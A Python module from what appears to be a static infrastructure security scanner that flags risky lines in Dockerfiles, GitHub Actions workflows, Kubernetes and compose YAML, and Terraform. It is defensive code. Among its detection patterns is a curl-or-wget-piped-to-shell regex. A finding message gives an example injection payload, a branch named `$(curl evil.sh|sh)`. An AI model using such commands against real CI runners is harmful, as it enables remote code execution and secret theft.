"""Infrastructure as text: Dockerfiles, CI workflows, Kubernetes, Terraform.

These exist so the specialist agents hired in Part 4 have real work. A
`container` agent that only prints "checking container" is theatre; this one
reads the Dockerfile and reports the line that runs the build as root.

Same rule as everywhere else: files are read, never executed. No `docker build`,
no `terraform plan`, no `kubectl`. Text in, findings out.
"""
from __future__ import annotations

import logging
import re
from pathlib import Path

from app.scanners.base import RawFinding, ScanContext

log = logging.getLogger(__name__)

SKIP_DIRS = {".git", "node_modules", "vendor", "dist", "build", ".venv", "venv",
             "__pycache__", ".terraform", "site-packages"}
MAX_BYTES = 400_000


def _f(slug: str, rule: str, title: str, sev: str, cwe: str, rel: str, line: int,
       why: str, fix: list[str], conf: float = 0.8) -> RawFinding:
    return RawFinding(
        scanner="checkov", agent_slug=slug, title=title, file=rel, line=line,
        rule_id=rule, cwe=cwe, severity_label=sev, summary=why, remediation=fix,
        extra={"confidence": conf, "engine": "builtin", "surface": slug},
    )


def _lines(path: Path) -> list[str]:
    try:
        if path.stat().st_size > MAX_BYTES:
            return []
        return path.read_text(encoding="utf-8", errors="replace").splitlines()
    except OSError:
        return []


# ===========================================================================
# Dockerfile
# ===========================================================================
_FROM = re.compile(r"^\s*FROM\s+(\S+)", re.I)
_USER = re.compile(r"^\s*USER\s+(\S+)", re.I)
_ADD_URL = re.compile(r"^\s*ADD\s+(https?://\S+)", re.I)
_CURL_SH = re.compile(r"(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(ba)?sh", re.I)
_SECRET_ENV = re.compile(
    r"^\s*(ENV|ARG)\s+([A-Z0-9_]*(PASSWORD|SECRET|TOKEN|APIKEY|API_KEY|PRIVATE_KEY)"
    r"[A-Z0-9_]*)\s*[= ]\s*(\S+)", re.I)
_PLACEHOLDER = re.compile(r"^[\"']?(\$\{|\$[A-Z]|changeme|xxx|your|<|placeholder|example)", re.I)


def scan_dockerfile(path: Path, rel: str) -> list[RawFinding]:
    out: list[RawFinding] = []
    lines = _lines(path)
    last_user: str | None = None
    last_user_line = 0
    base_line = 0
    base = ""

    for i, line in enumerate(lines, start=1):
        if line.lstrip().startswith("#"):
            continue

        m = _FROM.match(line)
        if m:
            base, base_line = m.group(1), i
            tail = base.rsplit("/", 1)[-1]
            tag = tail.rsplit(":", 1)[-1] if ":" in tail else ""
            if "@sha256:" not in base and tag in ("", "latest"):
                out.append(_f(
                    "container", "docker.floating-base",
                    f"Base image {base} is not pinned", "MEDIUM", "CWE-1357", rel, i,
                    f"Base image `{base}` is not pinned, so the image you tested and the "
                    f"image that ships can be different builds.",
                    [f"Pin by digest: FROM {base.split(':')[0]}@sha256:<digest>"],
                    conf=0.9))

        m = _USER.match(line)
        if m:
            last_user, last_user_line = m.group(1), i

        if _ADD_URL.match(line):
            out.append(_f(
                "container", "docker.add-remote",
                "ADD pulls a remote URL into the image", "HIGH", "CWE-494", rel, i,
                "ADD fetches a remote URL into the image with no checksum. Whatever that "
                "URL serves at build time is what ends up in production.",
                ["Use RUN curl with an explicit checksum verification, or COPY a vendored file"],
                conf=0.85))

        if _CURL_SH.search(line):
            out.append(_f(
                "container", "docker.curl-pipe-shell",
                "Remote script piped into a shell during build", "HIGH", "CWE-494", rel, i,
                "A downloaded script is piped straight into a shell. The build executes "
                "whatever that host returns, with no signature and no pinned version.",
                ["Download to a file, verify its checksum or signature, then execute it"],
                conf=0.9))

        m = _SECRET_ENV.match(line)
        if m and not _PLACEHOLDER.match(m.group(4)):
            out.append(_f(
                "container", "docker.secret-in-layer",
                f"{m.group(2)} is baked into an image layer", "HIGH", "CWE-798", rel, i,
                f"`{m.group(2)}` is baked into an image layer. Layers are readable by "
                f"anyone who can pull the image, and deleting it later does not remove it.",
                ["Pass it at runtime, or use BuildKit --mount=type=secret"],
                conf=0.75))

    if lines and (last_user is None or last_user.lower() in ("root", "0")):
        out.append(_f(
            "container", "docker.runs-as-root",
            "Container runs as root", "MEDIUM", "CWE-250", rel,
            last_user_line or base_line or 1,
            "The container runs as root. A flaw in the application is then a flaw with "
            "root inside the container, which is most of the way out of it.",
            ["Add a non-root user and a `USER app` line before CMD"],
            conf=0.85))
    return out


# ===========================================================================
# GitHub Actions
# ===========================================================================
_USES = re.compile(r"^\s*-?\s*uses:\s*['\"]?([^'\"\s#]+)")
_RUN = re.compile(r"^\s*-?\s*run:")
# ${{ github.event.* }} interpolated into a shell line is a remote code path:
# a PR title is attacker-controlled text pasted into your runner's shell.
_EVENT_EXPR = re.compile(
    r"\$\{\{\s*(github\.event\.[a-z_.]*(title|body|name|message|label|email|ref|login)"
    r"|github\.head_ref)")
_TRUSTED_ORGS = ("actions/", "github/", "docker/", "aws-actions/", "azure/",
                 "google-github-actions/", "hashicorp/")


def scan_workflow(path: Path, rel: str) -> list[RawFinding]:
    out: list[RawFinding] = []
    lines = _lines(path)
    body = "\n".join(lines)
    pr_target = "pull_request_target" in body
    checks_out_head = bool(re.search(r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head", body))

    if pr_target and checks_out_head:
        out.append(_f(
            "cicd", "gha.pwn-request",
            "pull_request_target checks out untrusted code", "CRITICAL", "CWE-94", rel,
            next((i for i, x in enumerate(lines, 1) if "pull_request_target" in x), 1),
            "`pull_request_target` runs with repository secrets, and this workflow checks "
            "out the pull request's own code. Anyone who opens a PR can run code with "
            "your secrets. This is the pwn-request pattern.",
            ["Split into two workflows: build untrusted code under `pull_request` without "
             "secrets, and handle the result separately"],
            conf=0.95))

    in_run = False
    for i, line in enumerate(lines, start=1):
        if _RUN.search(line):
            in_run = True
        elif line.strip() and not line.startswith((" ", "\t")):
            in_run = False

        m = _USES.match(line)
        if m:
            ref = m.group(1)
            if "@" in ref and not ref.startswith("./"):
                action, pin = ref.rsplit("@", 1)
                pinned = len(pin) == 40 and all(c in "0123456789abcdef" for c in pin.lower())
                trusted = action.lower().startswith(_TRUSTED_ORGS)
                if not pinned and not trusted:
                    out.append(_f(
                        "cicd", "gha.unpinned-action",
                        f"Third-party action {action} is pinned to a movable tag",
                        "MEDIUM", "CWE-829", rel, i,
                        f"`{action}` is pinned to `{pin}`, a tag the action's owner can move. "
                        f"Whoever controls that repository controls what runs in your CI.",
                        [f"Pin to a commit SHA: uses: {action}@<40-char sha>"],
                        conf=0.8))

        if _EVENT_EXPR.search(line) and (in_run or "run:" in line):
            out.append(_f(
                "cicd", "gha.script-injection",
                "Attacker-controlled event text is interpolated into a shell command",
                "HIGH", "CWE-94", rel, i,
                "Attacker-controlled event text is interpolated straight into a shell "
                "command. A branch named `$(curl evil.sh|sh)` executes on your runner.",
                ['Pass it through `env:` and reference "$VAR" inside the script'],
                conf=0.85))

    return out


# ===========================================================================
# Kubernetes and docker-compose
# ===========================================================================
_K8S_RULES = [
    (re.compile(r"^\s*privileged:\s*true", re.I), "k8s.privileged",
     "Privileged container", "CRITICAL", "CWE-250",
     "A privileged container has effectively the same access as root on the node. "
     "Container isolation no longer applies.",
     ["Set privileged: false and add only the specific capabilities needed"]),
    (re.compile(r"^\s*hostNetwork:\s*true", re.I), "k8s.host-network",
     "Pod shares the host network namespace", "HIGH", "CWE-668",
     "hostNetwork puts the pod on the node's network namespace, reaching services "
     "that believe they are only listening locally.",
     ["Remove hostNetwork and expose the port through a Service"]),
    (re.compile(r"^\s*hostPID:\s*true", re.I), "k8s.host-pid",
     "Pod shares the host PID namespace", "HIGH", "CWE-668",
     "hostPID lets the container see and signal every process on the node.",
     ["Remove hostPID"]),
    (re.compile(r"^\s*allowPrivilegeEscalation:\s*true", re.I), "k8s.privilege-escalation",
     "Privilege escalation is allowed", "MEDIUM", "CWE-250",
     "The container may gain more privileges than the process that started it.",
     ["Set allowPrivilegeEscalation: false"]),
    (re.compile(r"^\s*runAsUser:\s*0\b"), "k8s.run-as-root",
     "Pod runs as uid 0", "MEDIUM", "CWE-250",
     "The pod runs as root inside the container.",
     ["Set runAsUser to a non-zero uid and runAsNonRoot: true"]),
]
_COMPOSE_PRIV = re.compile(r"^\s*(privileged:\s*true|network_mode:\s*[\"']?host)", re.I)
_DOCKER_SOCK = re.compile(r"/var/run/docker\.sock")


def _looks_like_k8s(body: str) -> bool:
    return "apiVersion:" in body and "kind:" in body


def scan_yaml(path: Path, rel: str) -> list[RawFinding]:
    lines = _lines(path)
    if not lines:
        return []
    body = "\n".join(lines)
    is_k8s = _looks_like_k8s(body)
    is_compose = path.name.startswith("docker-compose") or path.name.startswith("compose.")
    if not (is_k8s or is_compose):
        return []

    out: list[RawFinding] = []
    for i, line in enumerate(lines, start=1):
        if is_k8s:
            for rx, rule, title, sev, cwe, why, fix in _K8S_RULES:
                if rx.match(line):
                    out.append(_f("iac", rule, title, sev, cwe, rel, i, why, fix, conf=0.9))
        if is_compose and _COMPOSE_PRIV.match(line):
            out.append(_f(
                "iac", "compose.privileged", "Service runs privileged or on the host network",
                "HIGH", "CWE-250", rel, i,
                "This service runs privileged or on the host network, so the container "
                "boundary is not doing anything.",
                ["Drop privileged / network_mode: host and map only the ports needed"],
                conf=0.85))
        if _DOCKER_SOCK.search(line):
            out.append(_f(
                "iac", "iac.docker-socket", "Docker socket is mounted into a container",
                "CRITICAL", "CWE-250", rel, i,
                "The Docker socket is mounted into the container. Anything inside can "
                "start a new privileged container on the host, which is a root shell.",
                ["Remove the mount, or use a socket proxy with a read-only allowlist"],
                conf=0.9))
    return out


# ===========================================================================
# Terraform
# ===========================================================================
_TF_RULES = [
    (re.compile(r"cidr_blocks\s*=\s*\[\s*\"0\.0\.0\.0/0\""), "tf.open-ingress",
     "Security group open to the whole internet", "HIGH", "CWE-284",
     "A security group rule accepts traffic from 0.0.0.0/0.",
     ["Narrow cidr_blocks to the ranges that actually need access"]),
    (re.compile(r"acl\s*=\s*\"public-read(-write)?\""), "tf.public-bucket",
     "Bucket ACL is world-readable", "CRITICAL", "CWE-732",
     "The bucket is world-readable. Everything written into it is public.",
     ['Set acl = "private" and grant access with a bucket policy or IAM']),
    (re.compile(r"(?<!not_)encrypted\s*=\s*false"), "tf.unencrypted",
     "Storage encryption is disabled", "MEDIUM", "CWE-311",
     "Storage encryption is explicitly turned off.",
     ["Set encrypted = true"]),
    (re.compile(r"publicly_accessible\s*=\s*true"), "tf.public-database",
     "Managed database is publicly accessible", "CRITICAL", "CWE-284",
     "The managed database is reachable from the public internet.",
     ["Set publicly_accessible = false and reach it from inside the VPC"]),
    (re.compile(r"\"Action\"\s*:\s*\"\*\"|Action\s*=\s*\[?\s*\"\*\""), "tf.wildcard-iam",
     "IAM policy grants every action", "HIGH", "CWE-732",
     "An IAM policy grants every action. A compromise of anything holding this role "
     "is a compromise of the account.",
     ["List the specific actions the role needs"]),
]


def scan_terraform(path: Path, rel: str) -> list[RawFinding]:
    out: list[RawFinding] = []
    for i, line in enumerate(_lines(path), start=1):
        stripped = line.lstrip()
        if stripped.startswith("#") or stripped.startswith("//"):
            continue
        for rx, rule, title, sev, cwe, why, fix in _TF_RULES:
            if rx.search(line):
                out.append(_f("iac", rule, title, sev, cwe, rel, i, why, fix, conf=0.85))
    return out


# ===========================================================================
def scan(ctx: ScanContext, surfaces: set[str] | None = None) -> list[RawFinding]:
    """`surfaces` limits the work to the agents that were actually hired."""
    want = surfaces or {"container", "cicd", "iac"}
    out: list[RawFinding] = []
    for path in ctx.root.rglob("*"):
        if not path.is_file() or path.is_symlink():
            continue
        if any(d in path.parts for d in SKIP_DIRS):
            continue
        rel = path.relative_to(ctx.root).as_posix()
        if not ctx.touched(rel):
            continue
        name, suffix = path.name.lower(), path.suffix.lower()

        if "container" in want and (name == "dockerfile" or name.startswith("dockerfile.")
                                    or suffix == ".dockerfile"):
            out.extend(scan_dockerfile(path, rel))
        elif "cicd" in want and "/.github/workflows/" in "/" + rel and suffix in (".yml", ".yaml"):
            out.extend(scan_workflow(path, rel))
        elif "iac" in want and suffix in (".yml", ".yaml"):
            out.extend(scan_yaml(path, rel))
        elif "iac" in want and suffix == ".tf":
            out.extend(scan_terraform(path, rel))

    log.info("infra: %d findings", len(out))
    return out
